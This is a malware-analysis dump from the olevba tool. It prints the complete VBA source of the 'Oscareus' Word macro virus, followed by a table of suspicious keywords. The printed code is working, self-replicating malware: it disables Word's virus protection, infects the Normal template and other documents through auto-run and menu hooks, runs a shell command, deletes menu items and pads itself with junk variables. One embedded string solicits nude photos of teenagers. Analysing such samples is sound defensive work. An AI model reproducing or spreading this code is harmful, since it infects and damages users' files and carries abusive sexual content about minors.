olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-b23811b52d20c74b16d268f071cb6e6424b65ae9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-b23811b52d20c74b16d268f071cb6e6424b65ae9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO oscareus.bas 
in file: Virus.MSWord.VMPC-based-b23811b52d20c74b16d268f071cb6e6424b65ae9 - OLE stream: 'Macros/VBA/oscareus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub oscareus()
    
    'VMPCK 1.0d w/Random Path + Update
    '=================================
    'Code Written by VicodinES
    '=================================
    'Poppy ID : 7212-PxTk85607212.c
    '=================================
    'This Virus Is: Oscareus.Poppy
    
On Error Resume Next
Randomize
QoMjAhNf = NfAh6497 & MgOj8989
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("oscareus").Export "c:\oscareus.drv"
ActiveDocument.ReadOnlyRecommended = False
SgKm = Int(Rnd * 10)
If SgKm = 3 Then Call QuBt8560TfCt
If Month(Now()) = 10 And Day(Now()) = 7 Then MsgBox "Oscareus2000", vbInformation, "Birthday Greeting!!!"
CxJu15536 = ImLmPpNq & DmTi12589 & Int(Rnd * 5538)
If NormalTemplate.VBProject.VBComponents.Item("oscareus").Name <> "oscareus" Then CoBw72126788 = True
If ActiveDocument.VBProject.VBComponents.Item("oscareus").Name <> "oscareus" Then UhCq6786 = True
NmPwMnPi = FuRs6824 & LjGy2906
If CoBw72126788 = True And UhCq6786 = False Then Set UoJk67872126 = NormalTemplate.VBProject.VBComponents
If CoBw72126788 = False And UhCq6786 = True Then Set UoJk67872126 = ActiveDocument.VBProject.VBComponents
UoJk67872126.import "c:\oscareus.drv"
If CoBw72126788 = True And UhCq6786 = False Then Shell ("label c: OSCAREUS"), 0
If CoBw72126788 = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
NqOuAkMs = JhQl10667 & JsPn6979
If UhCq6786 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
'VMPCK v1.0d [The Final Version?]
CzVuTlGz:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "fUck1n 0sc4r!", vbInformation
End Sub
Sub FileNew()
    On Error Resume Next
    Call oscareus
Dialogs(wdDialogFileNew).Show
RwMqFtPr = ClEt7490 & PsUx2959
    Skip = 1
    Call oscareus
QgTx1478 = LiMeDtDr & RtQj11024 & Int(Rnd * 1306)
End Sub
Sub FileSave()
    On Error Resume Next
RrEe11549 = DrRoSmOq & LlLw10712 & Int(Rnd * 4486)
    Call oscareus
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call oscareus
HzMr14323 = RpSeGoDk & HsHv16840 & PfTvVwEo & TpIj4783
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call oscareus
GoCm7322 = ToVhUuMy & MhSo6367 & Int(Rnd * 3818)
End Sub
Sub AutoExit()
    On Error Resume Next
    Call oscareus
UiTt3335 = PtFkBrNz & UgJg14490 & RtGwMtEj & DiQl14365
End Sub
Sub AutoClose()
    On Error Resume Next
    Call oscareus
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call oscareus
OoEsKxQe = SvAp11570 & OeGt15803
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call oscareus
DqGo7084 = RhUtTjIj & EfLn3898 & Int(Rnd * 1100)
MeQpGxNt = QoNg15831 & JtAj8937
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call oscareus
SvCpPlTz = LyKw18390 & UeLi11783
End Sub
Sub QuBt8560TfCt()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "Jestem sobie OscarN Jezeli macie zdjecia golych nastolatek z papierosem to podeslijcie mi!"
            .Replacement.Text = "Oscareus2000"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
FkUp5704 = RlIlClFj & QwJr5370 & Int(Rnd * 1973)
CommandBars("edit").Controls("Replace...").Delete
RkBu13095 = NlDvAgJj & MeCf12021 & Int(Rnd * 3151)
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

